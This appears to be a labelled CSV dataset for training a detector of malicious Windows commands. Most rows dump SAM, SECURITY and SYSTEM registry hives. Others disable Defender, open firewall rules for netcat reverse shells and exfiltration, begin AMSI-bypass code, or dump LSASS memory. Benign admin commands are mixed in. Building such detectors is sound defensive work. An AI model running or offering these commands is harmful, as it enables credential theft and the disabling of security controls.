text,label
reg save hklm\security c:\windows\temp\m096zi0d.save,1
reg save hklm\security c:\windows\temp\2oofau6w.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\4fpy13ae.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\gr99sjc8.dat""",1
reg   save   hklm\security   c:\windows\temp\fnce2c6v.save,1
"powershell -nop -c ""backup-utility write hklm\software to c:\backups\config.dat""",0
reg save hklm\sam c:\windows\temp\wnkskqe4.save,1
reg   export   hklm\security   c:\windows\temp\oj3b47pl.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ndgn2sv6.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\eatl1cpa.dat""",1
reg  save  hklm\sam  c:\windows\temp\upn7m4vm.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\tqa8w3pe.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\wr34hbyg.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\kciuzzv0.dat""",1
reg export hklm\security c:\windows\temp\px76f9e0.save,1
set-mppreference   -disablerealtimemonitoring   $true,2
reg export hklm\security c:\windows\temp\njntojhe.save,1
"cmd.exe /c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\puepsqap.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\6y6aiadq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ivjw4dr5.dat""",1
reg save hklm\security c:\windows\temp\rsxrw71z.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\vh49izxv.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6tuvfwaw.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\v4fzawiv.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\au7y4y8h.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\ikrrf206.dat""""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\pi59114l.save""",1
reg export hklm\security c:\windows\temp\srubvhbj.save,1
"powershell -nop -c ""sc  stop  windefend""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\lez8p856.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\nipmky2s.dat""",1
reg save hklm\sam c:\windows\temp\s6ncu33s.save,1
rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""reg export hklm\security c:\temp\ai0gg79t.dat""",1
reg save hklm\sam c:\windows\temp\smbwahj1.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\mguh4031.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\iq8uvphi.dat""",1
reg save hklm\system c:\windows\temp\0vtxvnss.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\gm4slil0.dat""",1
reg export hklm\sam c:\windows\temp\82r5mnl5.save,1
reg export hklm\system c:\windows\temp\yfn8e54o.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dbeytls7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\td2qtixs.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\8j5ju575.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\eiv75572.dat""",1
reg save hklm\security c:\windows\temp\6vwpem0j.save,1
reg save hklm\system c:\windows\temp\e0eathra.save,1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\vn28rgqp.dat""""",1
$a = [ref].assembly.gettype('system.management.automation.impersonateloggedonuser'),3
"cmd.exe /c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg save hklm\security c:\temp\665ehkh5.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\c7dt7k92.dat""",1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\wvswbqww.dat""",1
reg   export   hklm\sam   c:\windows\temp\lfi0nsk1.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
reg export hklm\system c:\windows\temp\vfe2glte.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ehwofvw8.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\wjqpx6b9.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\1s616s0f.dat""",1
"powershell -nop -c ""sc query windefend""",0
reg export hklm\system c:\windows\temp\1kl5fj4j.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\8ob4i9vn.dat""",1
reg save hklm\sam c:\windows\temp\zkojqso3.save,1
reg export hklm\security c:\windows\temp\uzxvs7fw.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\2p74izgi.dat""",1
reg save hklm\security c:\windows\temp\uif6f0el.save,1
reg save hklm\system c:\windows\temp\cfwvsmsf.save,1
"powershell -nop -c ""set-mppreference -disablerealtimemonitoring $true""",2
"powershell -nop -c ""reg export hklm\security c:\temp\am9lvycz.dat""",1
reg export hklm\sam c:\windows\temp\2nejzoqn.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ime0jlt4.dat""",1
reg export hklm\sam c:\windows\temp\tqvqqw7b.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\tmfk4b4s.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\tieug0ry.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\vtbc42ed.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\an3g58v3.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\heexehn5.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\mpp9shgc.dat""",1
reg save hklm\system c:\windows\temp\46628drw.save,1
reg save hklm\security c:\windows\temp\e6spmq2p.save,1
reg save hklm\sam c:\windows\temp\dtmsrydd.save,1
reg save hklm\system c:\windows\temp\7gzjoptn.save,1
reg export hklm\system c:\windows\temp\tz1mwtjj.save,1
reg export hklm\system c:\windows\temp\5h1bqs15.save,1
reg save hklm\sam c:\windows\temp\164zaiq2.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\r2soajph.dat""",1
reg export hklm\security c:\windows\temp\ekj0i6oo.save,1
reg export hklm\system c:\windows\temp\ghrn6bd6.save,1
reg export hklm\sam c:\windows\temp\2pygddqx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ydx31bu8.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\fr5pleqz.dat""",1
reg save hklm\system c:\windows\temp\5il46buc.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\iie6l0mt.dat""",1
reg save hklm\system c:\windows\temp\sk5wup32.save,1
reg export hklm\sam c:\windows\temp\0gpv71q0.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\v9q97a1h.save""",1
reg   export   hklm\security   c:\windows\temp\myabxpx9.save,1
"powershell -nop -c ""wmic   product   get   name,   version""",0
reg export hklm\security c:\windows\temp\o2lggjqo.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\da2bai13.dat""",1
reg save hklm\sam c:\windows\temp\c2t2bt23.save,1
reg export hklm\sam c:\windows\temp\xjefmz4y.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\ayg3yom7.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\l5amct7z.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\fjr4yncy.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\shb7jnpy.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\z5io25qm.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\dqlw7ova.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\c8tpx0os.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\r17ir2dd.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ut1zzqt9.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\jvv1z3m1.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\pi9l0jkz.dat""",1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\we0x30wu.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\i9qomyx7.dat""",1
reg export hklm\sam c:\windows\temp\my738dhi.save,1
reg export hklm\security c:\windows\temp\3jhyo27a.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ylo3ktlh.dat""",1
reg save hklm\sam c:\windows\temp\fbca6o8t.save,1
reg export hklm\security c:\windows\temp\gw1z5xfn.save,1
reg export hklm\security c:\windows\temp\ou0m0vkw.save,1
"cmd.exe /c ""select-string -path c:\logs\app.log -pattern 'failed logon'""",0
reg export hklm\security c:\windows\temp\vcv5ehnu.save,1
reg export hklm\sam c:\windows\temp\ej05e6gg.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\qmdqzot9.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3wk2g6ce.dat""",1
reg export hklm\system c:\windows\temp\lx3z69hl.save,1
reg export hklm\sam c:\windows\temp\cxnllh9t.save,1
"powershell -nop -c ""wmic product get name, version""",0
"powershell -nop -c ""reg export hklm\sam c:\temp\4pk2ru0k.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\imdoxycl.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\qfrekuu9.save""",1
reg export hklm\system c:\windows\temp\y0r10ijo.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\47krwdop.dat""",1
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
reg save hklm\system c:\windows\temp\hlu49xa5.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\457w3yxz.dat""",1
reg export hklm\system c:\windows\temp\mro5ytwk.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\l4ulnpj7.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mwbuc89x.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\9k9qcb36.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\sl67urp3.dat""",1
reg save hklm\system c:\windows\temp\qgswsnpt.save,1
reg export hklm\system c:\windows\temp\9dcv4l9z.save,1
reg export hklm\system c:\windows\temp\9oi85mcj.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\7yr7lupv.dat""",1
reg save hklm\system c:\windows\temp\k2nc27y7.save,1
reg save hklm\system c:\windows\temp\9drtyhhz.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\y5om3xqd.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\tl6v13tv.dat""",1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\yrfluy4j.dat""",1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
"cmd.exe /c ""reg export hklm\sam c:\temp\hd0fo6vw.dat""",1
reg export hklm\sam c:\windows\temp\wqhx97kb.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\30f24csn.dat""",1
reg save hklm\security c:\windows\temp\rlisuxct.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\dbh0zsnu.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\h182zw6u.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\fel5fses.dat""",1
reg save hklm\system c:\windows\temp\dpw1by8i.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\dmqofg4i.dat""",1
reg save hklm\sam c:\windows\temp\rs5q0fkc.save,1
reg save hklm\sam c:\windows\temp\ure85n2w.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\mp0c24iw.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\g1vh9r4w.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\vztwjotc.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ac18d8o0.dat""",1
reg export hklm\system c:\windows\temp\adr85jje.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\bla0bn6r.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\qqlwyzzt.dat""",1
reg save hklm\system c:\windows\temp\vo13jtdg.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\bjsgiyd2.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ji3uo75r.dat""",1
reg   save   hklm\sam   c:\windows\temp\zy0ufdfg.save,1
reg export hklm\sam c:\windows\temp\ejlb4gdy.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\3ifazlta.dat""",1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
"cmd.exe /c ""reg export hklm\sam c:\temp\9xekvsqb.dat""",1
reg export hklm\sam c:\windows\temp\eiajouur.save,1
reg   export   hklm\sam   c:\windows\temp\eupccykz.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\64479614.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\fxhtnwt1.dat""",1
rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe /c ""java -jar application.jar""",0
reg  export  hklm\sam  c:\windows\temp\xpo1j7vl.save,1
reg save hklm\sam c:\windows\temp\5cudyhuc.save,1
reg export hklm\system c:\windows\temp\ct2rlmqk.save,1
reg save hklm\sam c:\windows\temp\7vn0v9vg.save,1
reg save hklm\security c:\windows\temp\6aogv8go.save,1
reg save hklm\security c:\windows\temp\79jfhv52.save,1
reg export hklm\security c:\windows\temp\ntyfnwqd.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\804l2w8m.dat""",1
"powershell -nop -c ""select-string -path c:\logs\app.log -pattern 'failed logon'""",0
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\cqmh9tue.dat""""",1
"cmd.exe /c ""netsh dump > netconfig.txt""",0
"powershell -nop -c ""reg save hklm\security c:\temp\cc14olcs.dat""",1
reg save hklm\system c:\windows\temp\nz4cm7g2.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\y7zgcl39.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\lrp5j79r.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\53ieln63.dat""",1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\469roj8m.save""",1
reg save hklm\system c:\windows\temp\yjr6szrc.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\lkhziqtm.dat""",1
reg export hklm\sam c:\windows\temp\1ebmk7xh.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\bhvm55nj.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\yarqtiyz.dat""""",1
reg export hklm\system c:\windows\temp\2ui2efqf.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\jbfzprka.save""",1
reg export hklm\security c:\windows\temp\tlxg4k7h.save,1
reg export hklm\system c:\windows\temp\4axgtpzw.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\q65o8k4x.dat""",1
reg save hklm\system c:\windows\temp\jk9g0jlv.save,1
"powershell -nop -c ""rule: exfil data | app: any | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\system c:\windows\temp\48rxbeir.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\rh7j8npi.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\zh12oyit.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\t1z26p61.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\tv1f7bd7.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\l3iqtj23.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1kmh3f7l.dat""",1
reg save hklm\sam c:\windows\temp\291jjcwu.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\kbw2b2br.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\zf6new5v.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\i8it3pzl.dat""",1
reg export hklm\system c:\windows\temp\iv4jysjd.save,1
reg export hklm\security c:\windows\temp\9odcwcym.save,1
reg export hklm\system c:\windows\temp\y04e31e5.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\system c:\windows\temp\tt54qreu.save,1
reg export hklm\sam c:\windows\temp\c4fgx8cu.save,1
reg export hklm\system c:\windows\temp\qblzk9tr.save,1
"cmd.exe /c ""rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\z9wss7td.dat""",1
reg export hklm\security c:\windows\temp\ypnhsymn.save,1
reg save hklm\system c:\windows\temp\pghwmis3.save,1
reg export hklm\security c:\windows\temp\4oiop4ha.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\bebqo5ws.dat""",1
"powershell -nop -c ""netsh advfirewall firewall add rule name=""bad"" action=allow protocol=any port=4444""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\zi6as2ah.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1j8zwylj.dat""",1
reg  export  hklm\sam  c:\windows\temp\1c8ucgi5.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\pn9minxa.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\61pcupgn.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\mpyxiyds.dat""",1
reg save hklm\system c:\windows\temp\vl76phdi.save,1
reg save hklm\security c:\windows\temp\kbaa1s0b.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\09xna112.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\oiub7e2j.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\h0mwfnrb.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\vn8yxd81.save""",1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
reg  export  hklm\system  c:\windows\temp\2i4rnqqb.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\jak8fzj6.dat""",1
reg export hklm\security c:\windows\temp\8iamfokr.save,1
reg save hklm\sam c:\windows\temp\7lzhz6t9.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\h0zpiakh.dat""",1
reg export hklm\sam c:\windows\temp\tz8fsvlp.save,1
reg export hklm\security c:\windows\temp\8d6wf8f8.save,1
reg export hklm\security c:\windows\temp\osko9g62.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\wipmlmb5.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\n2trn2lm.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\q483ddr5.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\sa31xwly.dat""",1
reg save hklm\security c:\windows\temp\d5ha3lvo.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\uy6434g2.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\nvr5332s.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\nrw3rkv2.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\1jupma4s.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\yza2r9gf.dat""",1
"powershell -nop -c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\d2xrvgkg.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\81vw1h52.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3wl0tguf.dat""",1
reg save hklm\security c:\windows\temp\yu87ff2h.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\d8lirph4.dat""",1
reg export hklm\system c:\windows\temp\1p6fm5xl.save,1
reg save hklm\system c:\windows\temp\a4ngruba.save,1
reg save hklm\system c:\windows\temp\gp35o82l.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\jep6faba.dat""",1
reg export hklm\system c:\windows\temp\ybfnkx34.save,1
reg save hklm\system c:\windows\temp\8c6jmnkb.save,1
reg save hklm\sam c:\windows\temp\7w9mjedk.save,1
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg export hklm\security c:\windows\temp\wyanb7hz.save,1
reg export hklm\sam c:\windows\temp\fgbjlq1r.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3j8dltvq.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\09ik6uvp.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\syyd0bik.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\twjpe3fb.dat""",1
reg export hklm\sam c:\windows\temp\4atstfkt.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\npxtpudk.dat""",1
